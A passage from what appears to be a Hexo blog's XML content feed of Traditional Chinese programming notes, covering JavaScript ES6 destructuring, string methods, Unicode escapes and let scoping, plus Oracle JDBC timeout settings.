class="line"></span><br><span class="line">var &#123;x, y = 5&#125; = &#123;x: 1&#125;;</span><br><span class="line">x // 1</span><br><span class="line">y // 5</span><br><span class="line"></span><br><span class="line">var &#123;x: y = 3&#125; = &#123;&#125;;</span><br><span class="line">y // 3</span><br><span class="line"></span><br><span class="line">var &#123;x: y = 3&#125; = &#123;x: 5&#125;;</span><br><span class="line">y // 5</span><br><span class="line"></span><br><span class="line">var &#123; message: msg = <span class="string">&#x27;Something went wrong&#x27;</span> &#125; = &#123;&#125;;</span><br><span class="line">msg // <span class="string">&quot;Something went wrong&quot;</span></span><br><span class="line"></span><br><span class="line">屬性x 等於 null，因為null !=== undefined，導致default value 不會生效</span><br><span class="line">var &#123;x = 3&#125; = &#123;x: undefined&#125;;</span><br><span class="line">x // 3</span><br><span class="line"></span><br><span class="line">var &#123;x = 3&#125; = &#123;x: null&#125;;</span><br><span class="line">x // null</span><br></pre></td></tr></table></figure>

<h3 id="Destructuration用途"><a href="#Destructuration用途" class="headerlink" title="Destructuration用途"></a>Destructuration用途</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">1. swap variable value:</span><br><span class="line"><span class="built_in">let</span> x = 1;</span><br><span class="line"><span class="built_in">let</span> y = 2;</span><br><span class="line"></span><br><span class="line">[x, y] = [y, x];</span><br><span class="line"></span><br><span class="line">2. <span class="built_in">return</span> multiple values:</span><br><span class="line"><span class="built_in">return</span> array:</span><br><span class="line"><span class="keyword">function</span> <span class="function"><span class="title">example</span></span>() &#123;</span><br><span class="line">  <span class="built_in">return</span> [1, 2, 3];</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">let</span> [a, b, c] = example();</span><br><span class="line"><span class="built_in">return</span> object:</span><br><span class="line"><span class="keyword">function</span> <span class="function"><span class="title">example</span></span>() &#123;</span><br><span class="line">  <span class="built_in">return</span> &#123;</span><br><span class="line">    foo: 1,</span><br><span class="line">    bar: 2</span><br><span class="line">  &#125;;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">let</span> &#123; foo, bar &#125; = example();</span><br><span class="line"></span><br><span class="line">3. define <span class="keyword">function</span> parameters:</span><br><span class="line">parameters 有順序性 -&gt; array</span><br><span class="line">-----------------------------</span><br><span class="line"><span class="keyword">function</span> f([x, y, z]) &#123; ... &#125;</span><br><span class="line">f([1, 2, 3]);</span><br><span class="line">parameters 無順序性 -&gt; object</span><br><span class="line">-----------------------------</span><br><span class="line"><span class="keyword">function</span> f(&#123;x, y, z&#125;) &#123; ... &#125;</span><br><span class="line">f(&#123;z: 3, y: 2, x: 1&#125;);</span><br><span class="line"></span><br><span class="line">4. fetch json data:</span><br><span class="line"><span class="built_in">let</span> jsonData = &#123;</span><br><span class="line">  <span class="built_in">id</span>: 42,</span><br><span class="line">  status: <span class="string">&quot;OK&quot;</span>,</span><br><span class="line">  data: [867, 5309]</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="built_in">let</span> &#123; <span class="built_in">id</span>, status, data: number &#125; = jsonData;</span><br><span class="line"></span><br><span class="line">console.log(<span class="built_in">id</span>, status, number);</span><br><span class="line">// 42, <span class="string">&quot;OK&quot;</span>, [867, 5309]</span><br><span class="line"></span><br><span class="line">5. <span class="keyword">function</span> default parameters:</span><br><span class="line">jQuery.ajax = <span class="keyword">function</span> (url, &#123;</span><br><span class="line">  async = <span class="literal">true</span>,</span><br><span class="line">  beforeSend = <span class="function"><span class="title">function</span></span> () &#123;&#125;,</span><br><span class="line">  cache = <span class="literal">true</span>,</span><br><span class="line">  complete = <span class="function"><span class="title">function</span></span> () &#123;&#125;,</span><br><span class="line">  crossDomain = <span class="literal">false</span>,</span><br><span class="line">  global = <span class="literal">true</span>,</span><br><span class="line">  // ... more config</span><br><span class="line">&#125; = &#123;&#125;) &#123;</span><br><span class="line">  // ... <span class="keyword">do</span> stuff</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">6. <span class="keyword">for</span> loop -&gt; Map</span><br><span class="line">任何有實作Iterator interface的結構，都可以用<span class="keyword">for</span></span><br><span class="line">const map = new Map();</span><br><span class="line">map.set(<span class="string">&#x27;first&#x27;</span>, <span class="string">&#x27;hello&#x27;</span>);</span><br><span class="line">map.set(<span class="string">&#x27;second&#x27;</span>, <span class="string">&#x27;world&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="built_in">let</span> [key, value] of map) &#123;</span><br><span class="line">  console.log(key + <span class="string">&quot; is &quot;</span> + value);</span><br><span class="line">&#125;</span><br><span class="line">// first is hello</span><br><span class="line">// second is world</span><br><span class="line"></span><br><span class="line">get key:</span><br><span class="line"><span class="keyword">for</span> (<span class="built_in">let</span> [key] of map) &#123;</span><br><span class="line">  // ...</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">get value:</span><br><span class="line"><span class="keyword">for</span> (<span class="built_in">let</span> [,value] of map) &#123;</span><br><span class="line">  // ...</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">7. 指定import module</span><br><span class="line">const &#123; SourceMapConsumer, SourceNode &#125; = require(<span class="string">&quot;source-map&quot;</span>);</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>JavaScript</category>
      </categories>
      <tags>
        <tag>Object</tag>
      </tags>
  </entry>
  <entry>
    <title>JavaJDBC-timeout</title>
    <url>/posts/b3b06268/</url>
    <content><![CDATA[<h3 id="JavaJDBC-timeout"><a href="#JavaJDBC-timeout" class="headerlink" title="JavaJDBC-timeout"></a>JavaJDBC-timeout</h3><span id="more"></span>
<p>在Oracle JDBC執行SQL有幾個設定timeout的方法，提供參考。</p>
<h3 id="Connection-pool"><a href="#Connection-pool" class="headerlink" title="Connection pool"></a>Connection pool</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">import org.apache.tomcat.jdbc.pool.DataSource;</span><br><span class="line"></span><br><span class="line">DataSource datasource = new DataSource();</span><br><span class="line">// 是否檢查借出未歸還的連線</span><br><span class="line">datasource.setRemoveAbandoned(<span class="literal">true</span>);</span><br><span class="line">// 借出未歸還的連線到多久的時候中斷</span><br><span class="line">datasource.setRemoveAbandonedTimeout(120);</span><br><span class="line">// 多久檢查一次借出未歸還的連線，所以這個案例最糟狀況可能是(120+60)秒</span><br><span class="line">datasource.setTimeBetweenEvictionRunsMillis(60 * 1000);</span><br><span class="line"></span><br><span class="line">1. 當程式從pool要求connection時開始計算，超過秒數時，pool會強制中斷連線，並從pool移除，</span><br><span class="line">   等隨後對conn做操作時，會拋出java.sql.SQLException: Connection has already been closed的例外</span><br><span class="line">2. 避免當程式忘記關connection時，資源可以被釋放</span><br><span class="line">3. 避免當DB連線異常時，connection持續被鎖住</span><br><span class="line">4. 因為是強制中斷，所以無法rollback跟commit，執行結果可能不如預期</span><br></pre></td></tr></table></figure>

<h3 id="getWriteConnection-int-timeout"><a href="#getWriteConnection-int-timeout" class="headerlink" title="getWriteConnection(int timeout)"></a>getWriteConnection(int timeout)</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">藉由<span class="built_in">timeout</span>這個參數可以覆寫預設在connection pool內的abandonedTimeout時間，</span><br><span class="line">藉此，當我們在執行一些需要大量時間的函數時，可以避免連線被connection pool中斷</span><br></pre></td></tr></table></figure>

<h3 id="setQueryTimeout-int-timeout"><a href="#setQueryTimeout-int-timeout" class="headerlink" title="setQueryTimeout(int timeout)"></a>setQueryTimeout(int timeout)</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">在PreparedStatement裡面有一個setQueryTimeout函數，藉此可以指定執行的時間</span><br><span class="line"></span><br><span class="line">1. 執行超過指定時間，會拋出SQLTimeoutException例外，但connection不會被關閉，也不會從pool移除</span><br><span class="line">2. 對時間比較敏感的查詢程式，例如cache的更新，可以設定一個執行時間，超過預期時，可以查找另一個node</span><br><span class="line">3. 對比較依賴最後更新時間的table，可以避免執行時間過長，導致cache沒抓到資料</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>Timeout</tag>
        <tag>JDBC</tag>
      </tags>
  </entry>
  <entry>
    <title>JavaScript-ES6-String Methods</title>
    <url>/posts/afd7e545/</url>
    <content><![CDATA[<h3 id="JavaScript-ES6-String相關methods"><a href="#JavaScript-ES6-String相關methods" class="headerlink" title="JavaScript-ES6-String相關methods"></a>JavaScript-ES6-String相關methods</h3><span id="more"></span>
<p>這篇簡介JavaScript-ES6 String相關methods。</p>
<h3 id="String-fromCodePoint"><a href="#String-fromCodePoint" class="headerlink" title="String.fromCodePoint()"></a>String.fromCodePoint()</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">在ES5提供String.fromCharCode()方法</span><br><span class="line">String.fromCharCode(0x20BB7) --&gt; 不能識別超過0xFFFF的字元，此例造成溢位(0x20BB7 -&gt; 0x20BB)</span><br><span class="line">// <span class="string">&quot;ஷ&quot;</span></span><br><span class="line"></span><br><span class="line">在ES6提供String.fromCodePoint()方法</span><br><span class="line">String.fromCodePoint(0x20BB7)</span><br><span class="line">// <span class="string">&quot;𠮷&quot;</span></span><br><span class="line">String.fromCodePoint(0x78, 0x1f680, 0x79) === <span class="string">&#x27;x\uD83D\uDE80y&#x27;</span> --&gt; 多個參數會被合併成一個String</span><br><span class="line">// <span class="literal">true</span></span><br></pre></td></tr></table></figure>

<h3 id="String-raw"><a href="#String-raw" class="headerlink" title="String.raw()"></a>String.raw()</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">// `foo<span class="variable">$&#123;1 + 2&#125;</span>bar`</span><br><span class="line">// 等同於</span><br><span class="line">String.raw(&#123; raw: [<span class="string">&#x27;foo&#x27;</span>, <span class="string">&#x27;bar&#x27;</span>] &#125;, 1 + 2) // <span class="string">&quot;foo3bar&quot;</span></span><br><span class="line"></span><br><span class="line">方法實作:</span><br><span class="line">String.raw = <span class="keyword">function</span> (strings, ...values) &#123;</span><br><span class="line">  <span class="built_in">let</span> output = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">  <span class="built_in">let</span> index;</span><br><span class="line">  <span class="keyword">for</span> (index = 0; index &lt; values.length; index++) &#123;</span><br><span class="line">    output += strings.raw[index] + values[index];</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  output += strings.raw[index]</span><br><span class="line">  <span class="built_in">return</span> output;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="includes-startsWith-endsWith"><a href="#includes-startsWith-endsWith" class="headerlink" title="includes(), startsWith(), endsWith()"></a>includes(), startsWith(), endsWith()</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="built_in">let</span> s = <span class="string">&#x27;Hello world!&#x27;</span>;</span><br><span class="line"></span><br><span class="line">s.startsWith(<span class="string">&#x27;Hello&#x27;</span>) // <span class="literal">true</span></span><br><span class="line">s.endsWith(<span class="string">&#x27;!&#x27;</span>) // <span class="literal">true</span></span><br><span class="line">s.includes(<span class="string">&#x27;o&#x27;</span>) // <span class="literal">true</span></span><br><span class="line">---------------------------------</span><br><span class="line"><span class="built_in">let</span> s = <span class="string">&#x27;Hello world!&#x27;</span>;</span><br><span class="line"></span><br><span class="line">s.startsWith(<span class="string">&#x27;world&#x27;</span>, 6) // <span class="literal">true</span></span><br><span class="line">s.endsWith(<span class="string">&#x27;Hello&#x27;</span>, 5) // <span class="literal">true</span></span><br><span class="line">s.includes(<span class="string">&#x27;Hello&#x27;</span>, 6) // <span class="literal">false</span></span><br></pre></td></tr></table></figure>

<h3 id="repeat"><a href="#repeat" class="headerlink" title="repeat()"></a>repeat()</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;x&#x27;</span>.repeat(3) // <span class="string">&quot;xxx&quot;</span></span><br><span class="line"><span class="string">&#x27;hello&#x27;</span>.repeat(2) // <span class="string">&quot;hellohello&quot;</span></span><br><span class="line"><span class="string">&#x27;na&#x27;</span>.repeat(0) // <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;na&#x27;</span>.repeat(2.9) // <span class="string">&quot;nana&quot;</span>  --&gt; 小數會被取整數</span><br><span class="line"></span><br><span class="line">若參數是Infinity或負數，RangeError</span><br><span class="line"><span class="string">&#x27;na&#x27;</span>.repeat(Infinity)</span><br><span class="line">// RangeError</span><br><span class="line"><span class="string">&#x27;na&#x27;</span>.repeat(-1)</span><br><span class="line">// RangeError</span><br><span class="line"></span><br><span class="line">參數是-1 ~ 0的小數，因會取整數運算，故等於0</span><br><span class="line"><span class="string">&#x27;na&#x27;</span>.repeat(-0.9) // <span class="string">&quot;&quot;</span></span><br><span class="line">參數是NaN，等同0</span><br><span class="line"><span class="string">&#x27;na&#x27;</span>.repeat(NaN) // <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">參數若是字串，會轉成數字</span><br><span class="line"><span class="string">&#x27;na&#x27;</span>.repeat(<span class="string">&#x27;na&#x27;</span>) // <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="string">&#x27;na&#x27;</span>.repeat(<span class="string">&#x27;3&#x27;</span>) // <span class="string">&quot;nanana&quot;</span></span><br></pre></td></tr></table></figure>

<h3 id="padStart-，padEnd"><a href="#padStart-，padEnd" class="headerlink" title="padStart()，padEnd()"></a>padStart()，padEnd()</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;x&#x27;</span>.padStart(5, <span class="string">&#x27;ab&#x27;</span>) // <span class="string">&#x27;ababx&#x27;</span></span><br><span class="line"><span class="string">&#x27;x&#x27;</span>.padStart(4, <span class="string">&#x27;ab&#x27;</span>) // <span class="string">&#x27;abax&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;x&#x27;</span>.padEnd(5, <span class="string">&#x27;ab&#x27;</span>) // <span class="string">&#x27;xabab&#x27;</span></span><br><span class="line"><span class="string">&#x27;x&#x27;</span>.padEnd(4, <span class="string">&#x27;ab&#x27;</span>) // <span class="string">&#x27;xaba&#x27;</span></span><br><span class="line"></span><br><span class="line">若原字串長度 &gt;= 第一個參數，則<span class="built_in">return</span> 原字串</span><br><span class="line"><span class="string">&#x27;xxx&#x27;</span>.padStart(2, <span class="string">&#x27;ab&#x27;</span>) // <span class="string">&#x27;xxx&#x27;</span></span><br><span class="line"><span class="string">&#x27;xxx&#x27;</span>.padEnd(2, <span class="string">&#x27;ab&#x27;</span>) // <span class="string">&#x27;xxx&#x27;</span></span><br><span class="line"></span><br><span class="line">字串長度 + 補足字元參數 &gt; 第一個參數長度，則截去補足字元參數</span><br><span class="line"><span class="string">&#x27;abc&#x27;</span>.padStart(10, <span class="string">&#x27;0123456789&#x27;</span>)</span><br><span class="line">// <span class="string">&#x27;0123456abc&#x27;</span></span><br><span class="line"></span><br><span class="line">沒有第二個參數，用空格補足</span><br><span class="line"><span class="string">&#x27;x&#x27;</span>.padStart(4) // <span class="string">&#x27;   x&#x27;</span></span><br><span class="line"><span class="string">&#x27;x&#x27;</span>.padEnd(4) // <span class="string">&#x27;x   &#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;1&#x27;</span>.padStart(10, <span class="string">&#x27;0&#x27;</span>) // <span class="string">&quot;0000000001&quot;</span></span><br><span class="line"><span class="string">&#x27;12&#x27;</span>.padStart(10, <span class="string">&#x27;0&#x27;</span>) // <span class="string">&quot;0000000012&quot;</span></span><br><span class="line"><span class="string">&#x27;123456&#x27;</span>.padStart(10, <span class="string">&#x27;0&#x27;</span>) // <span class="string">&quot;0000123456&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;12&#x27;</span>.padStart(10, <span class="string">&#x27;YYYY-MM-DD&#x27;</span>) // <span class="string">&quot;YYYY-MM-12&quot;</span></span><br><span class="line"><span class="string">&#x27;09-12&#x27;</span>.padStart(10, <span class="string">&#x27;YYYY-MM-DD&#x27;</span>) // <span class="string">&quot;YYYY-09-12&quot;</span></span><br></pre></td></tr></table></figure>

<h3 id="trimStart-，trimEnd"><a href="#trimStart-，trimEnd" class="headerlink" title="trimStart()，trimEnd()"></a>trimStart()，trimEnd()</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">const s = <span class="string">&#x27;  abc  &#x27;</span>;</span><br><span class="line"></span><br><span class="line">s.trim() // <span class="string">&quot;abc&quot;</span></span><br><span class="line">s.trimStart() // <span class="string">&quot;abc  &quot;</span></span><br><span class="line">s.trimEnd() // <span class="string">&quot;  abc&quot;</span></span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>JavaScript</category>
      </categories>
      <tags>
        <tag>String</tag>
      </tags>
  </entry>
  <entry>
    <title>JavaScript-ES6-String</title>
    <url>/posts/708abb80/</url>
    <content><![CDATA[<h3 id="JavaScript-ES6-String"><a href="#JavaScript-ES6-String" class="headerlink" title="JavaScript-ES6-String"></a>JavaScript-ES6-String</h3><span id="more"></span>
<p>這篇簡介JavaScript-ES6 String。</p>
<h3 id="String"><a href="#String" class="headerlink" title="String"></a>String</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">ES6 enhance Unicode:</span><br><span class="line"><span class="string">&quot;\u0061&quot;</span></span><br><span class="line">// <span class="string">&quot;a&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;\uD842\uDFB7&quot;</span></span><br><span class="line">// <span class="string">&quot;𠮷&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;\u20BB7&quot;</span></span><br><span class="line">// <span class="string">&quot; 7&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;\u&#123;20BB7&#125;&quot;</span></span><br><span class="line">// <span class="string">&quot;𠮷&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;\u&#123;41&#125;\u&#123;42&#125;\u&#123;43&#125;&quot;</span></span><br><span class="line">// <span class="string">&quot;ABC&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">let</span> hello = 123;</span><br><span class="line">hell\u&#123;6F&#125; // 123</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;\u&#123;1F680&#125;&#x27;</span> === <span class="string">&#x27;\uD83D\uDE80&#x27;</span>  --&gt; &#123;&#125; 表示法 與 UTF-16 是相等的</span><br><span class="line">// <span class="literal">true</span></span><br><span class="line"></span><br><span class="line">有六種表示法可以表示同一個String</span><br><span class="line"><span class="string">&#x27;z&#x27;</span> === <span class="string">&#x27;z&#x27;</span></span><br><span class="line"><span class="string">&#x27;\z&#x27;</span> === <span class="string">&#x27;z&#x27;</span>  // <span class="literal">true</span></span><br><span class="line"><span class="string">&#x27;\172&#x27;</span> === <span class="string">&#x27;z&#x27;</span> // <span class="literal">true</span></span><br><span class="line"><span class="string">&#x27;\x7A&#x27;</span> === <span class="string">&#x27;z&#x27;</span> // <span class="literal">true</span></span><br><span class="line"><span class="string">&#x27;\u007A&#x27;</span> === <span class="string">&#x27;z&#x27;</span> // <span class="literal">true</span></span><br><span class="line"><span class="string">&#x27;\u&#123;7A&#125;&#x27;</span> === <span class="string">&#x27;z&#x27;</span> // <span class="literal">true</span></span><br></pre></td></tr></table></figure>

<h3 id="for-loop-String"><a href="#for-loop-String" class="headerlink" title="for loop - String"></a>for loop - String</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="built_in">let</span> codePoint of <span class="string">&#x27;foo&#x27;</span>) &#123;</span><br><span class="line">  console.log(codePoint)</span><br><span class="line">&#125;</span><br><span class="line">// <span class="string">&quot;f&quot;</span></span><br><span class="line">// <span class="string">&quot;o&quot;</span></span><br><span class="line">// <span class="string">&quot;o&quot;</span></span><br><span class="line">------------------------------</span><br><span class="line"><span class="built_in">let</span> text = String.fromCodePoint(0x20BB7);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="built_in">let</span> i = 0; i &lt; text.length; i++) &#123;</span><br><span class="line">  console.log(text[i]);</span><br><span class="line">&#125;</span><br><span class="line">// <span class="string">&quot; &quot;</span></span><br><span class="line">// <span class="string">&quot; &quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="built_in">let</span> i of text) &#123;</span><br><span class="line">  console.log(i);</span><br><span class="line">&#125;</span><br><span class="line">// <span class="string">&quot;𠮷&quot;</span></span><br></pre></td></tr></table></figure>

<h3 id="JSON-stringify"><a href="#JSON-stringify" class="headerlink" title="JSON.stringify()"></a>JSON.stringify()</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">編碼:UTF-8</span><br><span class="line">JSON.stringify()的問題是可能<span class="built_in">return</span> 0xD800到0xDFFF之間的編碼。</span><br><span class="line">ES2019改成如果遇到0xD800到0xDFFF或是不存在的一對編碼，會<span class="built_in">return</span> 跳脫字串。</span><br><span class="line">JSON.stringify(<span class="string">&#x27;\u&#123;D834&#125;&#x27;</span>) // <span class="string">&quot;&quot;</span>\\uD834<span class="string">&quot;&quot;</span></span><br><span class="line">JSON.stringify(<span class="string">&#x27;\uDF06\uD834&#x27;</span>) // <span class="string">&quot;&quot;</span>\\udf06\\ud834<span class="string">&quot;&quot;</span></span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>JavaScript</category>
      </categories>
      <tags>
        <tag>String</tag>
      </tags>
  </entry>
  <entry>
    <title>JavaScript-ES6-variable 1st</title>
    <url>/posts/325ec38e/</url>
    <content><![CDATA[<h3 id="JavaScript-ES6-variable-1st"><a href="#JavaScript-ES6-variable-1st" class="headerlink" title="JavaScript-ES6-variable 1st"></a>JavaScript-ES6-variable 1st</h3><span id="more"></span>
<p>這篇介紹在JavaScript-ES6 有關variable的基本用法及簡介。</p>
<h3 id="variable-assign-value"><a href="#variable-assign-value" class="headerlink" title="variable assign value"></a>variable assign value</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">在ES6之前:</span><br><span class="line"><span class="built_in">let</span> a = 1;</span><br><span class="line"><span class="built_in">let</span> b = 2;</span><br><span class="line"><span class="built_in">let</span> c = 3;</span><br><span class="line"></span><br><span class="line">ES6可以這樣寫:</span><br><span class="line"><span class="built_in">let</span> [a, b, c] = [1, 2, 3];</span><br><span class="line"></span><br><span class="line"><span class="built_in">let</span> [foo, [[bar], baz]] = [1, [[2], 3]];</span><br><span class="line">foo // 1</span><br><span class="line">bar // 2</span><br><span class="line">baz // 3</span><br><span class="line"></span><br><span class="line"><span class="built_in">let</span> [ , , third] = [<span class="string">&quot;foo&quot;</span>, <span class="string">&quot;bar&quot;</span>, <span class="string">&quot;baz&quot;</span>];</span><br><span class="line">third // <span class="string">&quot;baz&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">let</span> [x, , y] = [1, 2, 3];</span><br><span class="line">x // 1</span><br><span class="line">y // 3</span><br><span class="line"></span><br><span class="line"><span class="built_in">let</span> [<span class="built_in">head</span>, ...<span class="built_in">tail</span>] = [1, 2, 3, 4];</span><br><span class="line"><span class="built_in">head</span> // 1</span><br><span class="line"><span class="built_in">tail</span> // [2, 3, 4]</span><br><span class="line"></span><br><span class="line"><span class="built_in">let</span> [x, y, ...z] = [<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line">x // <span class="string">&quot;a&quot;</span></span><br><span class="line">y // undefined</span><br><span class="line">z // []</span><br><span class="line"></span><br><span class="line">Destructuration 失敗example:</span><br><span class="line"><span class="built_in">let</span> [foo] = [];</span><br><span class="line"><span class="built_in">let</span> [bar, foo] = [1];</span><br><span class="line">Output:foo : undefined</span><br><span class="line"></span><br><span class="line">不完全Destructuration example:</span><br><span class="line"><span class="built_in">let</span> [x, y] = [1, 2, 3];</span><br><span class="line">x // 1</span><br><span class="line">y // 2</span><br><span class="line"></span><br><span class="line"><span class="built_in">let</span> [a, [b], d] = [1, [2, 3], 4];</span><br><span class="line">a // 1</span><br><span class="line">b // 2</span><br><span class="line">d // 4</span><br><span class="line"></span><br><span class="line">若=左邊是array，但=右邊不是array，則會error</span><br><span class="line">//error</span><br><span class="line"><span class="built_in">let</span> [foo] = 1;</span><br><span class="line"><span class="built_in">let</span> [foo] = <span class="literal">false</span>;</span><br><span class="line"><span class="built_in">let</span> [foo] = NaN;</span><br><span class="line"><span class="built_in">let</span> [foo] = undefined;</span><br><span class="line"><span class="built_in">let</span> [foo] = null;</span><br><span class="line"><span class="built_in">let</span> [foo] = &#123;&#125;;</span><br><span class="line"></span><br><span class="line">Set也可以使用array Destructuration:</span><br><span class="line"><span class="built_in">let</span> [x, y, z] = new Set([<span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;b&#x27;</span>, <span class="string">&#x27;c&#x27;</span>]);</span><br><span class="line">x // <span class="string">&quot;a&quot;</span></span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>JavaScript</category>
      </categories>
      <tags>
        <tag>variable</tag>
      </tags>
  </entry>
  <entry>
    <title>JavaScript-ES6-function-partII</title>
    <url>/posts/23659182/</url>
    <content><![CDATA[<h3 id="JavaScript-ES6-function-partII"><a href="#JavaScript-ES6-function-partII" class="headerlink" title="JavaScript-ES6-function-partII"></a>JavaScript-ES6-function-partII</h3><span id="more"></span>
<p>這篇簡介JavaScript-ES6-function-partII。</p>
<h3 id="ObjectDestructuration-Example"><a href="#ObjectDestructuration-Example" class="headerlink" title="ObjectDestructuration Example"></a>ObjectDestructuration Example</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> fetch(url, &#123; body = <span class="string">&#x27;&#x27;</span>, method = <span class="string">&#x27;GET&#x27;</span>, headers = &#123;&#125; &#125;) &#123;</span><br><span class="line">  console.log(method);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">fetch(<span class="string">&#x27;http://example.com&#x27;</span>, &#123;&#125;)</span><br><span class="line">// <span class="string">&quot;GET&quot;</span></span><br><span class="line"></span><br><span class="line">fetch(<span class="string">&#x27;http://example.com&#x27;</span>)</span><br><span class="line">// error</span><br><span class="line"></span><br><span class="line">此例第二個參數是object，可以為三個屬性設置default value</span><br><span class="line">但這種用法不能省略第二個參數</span><br><span class="line">---------</span><br><span class="line">欲省略第二個參數的作法如下:</span><br><span class="line"><span class="keyword">function</span> fetch(url, &#123; body = <span class="string">&#x27;&#x27;</span>, method = <span class="string">&#x27;GET&#x27;</span>, headers = &#123;&#125; &#125; = &#123;&#125;) &#123;</span><br><span class="line">  console.log(method);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">fetch(<span class="string">&#x27;http://example.com&#x27;</span>)</span><br><span class="line">// <span class="string">&quot;GET&quot;</span></span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>JavaScript</category>
      </categories>
      <tags>
        <tag>function</tag>
      </tags>
  </entry>
  <entry>
    <title>JavaScript-ES6-let</title>
    <url>/posts/90932f1e/</url>
    <content><![CDATA[<h3 id="JavaScript-ES6-let"><a href="#JavaScript-ES6-let" class="headerlink" title="JavaScript-ES6-let"></a>JavaScript-ES6-let</h3><span id="more"></span>
<p>ES6 新增了let語法，用來宣告變數。它的用法類似var，但是所宣告的變數，let語法只在所在的代碼區塊内有效。</p>
<h3 id="let語法只在所在的代碼區塊内有效-Example"><a href="#let語法只在所在的代碼區塊内有效-Example" class="headerlink" title="let語法只在所在的代碼區塊内有效 - Example"></a>let語法只在所在的代碼區塊内有效 - Example</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="built_in">let</span> a = 10;</span><br><span class="line">  var b = 1;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">a // ReferenceError: a is not defined.</span><br><span class="line">b // 1</span><br></pre></td></tr></table></figure>

<h3 id="for迴圈適合用let語法定義"><a href="#for迴圈適合用let語法定義" class="headerlink" title="for迴圈適合用let語法定義"></a>for迴圈適合用let語法定義</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="built_in">let</span> i = 0; i &lt; 10; i++) &#123;</span><br><span class="line">  // ...</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">console.log(i);</span><br><span class="line">// ReferenceError: i is not defined</span><br></pre></td></tr></table></figure>

<h3 id="for迴圈特殊用法"><a href="#for迴圈特殊用法" class="headerlink" title="for迴圈特殊用法"></a>for迴圈特殊用法</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="built_in">let</span> i = 0; i &lt; 3; i++) &#123;</span><br><span class="line">  <span class="built_in">let</span> i = <span class="string">&#x27;abc&#x27;</span>;</span><br><span class="line">  console.log(i);</span><br><span class="line">&#125;</span><br><span class="line">// abc</span><br><span class="line">// abc</span><br><span class="line">// abc</span><br><span class="line"></span><br><span class="line">上述例子印出三次abc，表示(<span class="built_in">let</span> i = 0) 和 <span class="built_in">let</span> i = <span class="string">&#x27;abc&#x27;</span>;</span><br><span class="line">兩者屬於不同區塊</span><br></pre></td></tr></table></figure>

<h3 id="let宣告必須在使用變數前宣告，否則報錯"><a href="#let宣告必須在使用變數前宣告，否則報錯" class="headerlink" title="let宣告必須在使用變數前宣告，否則報錯"></a>let宣告必須在使用變數前宣告，否則報錯</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">// var 的情况</span><br><span class="line">console.log(foo); // 輸出undefined</span><br><span class="line">var foo = 2;</span><br><span class="line"></span><br><span class="line">// <span class="built_in">let</span> 的情况</span><br><span class="line">console.log(bar); // 報錯ReferenceError</span><br><span class="line"><span class="built_in">let</span> bar = 2;</span><br></pre></td></tr></table></figure>

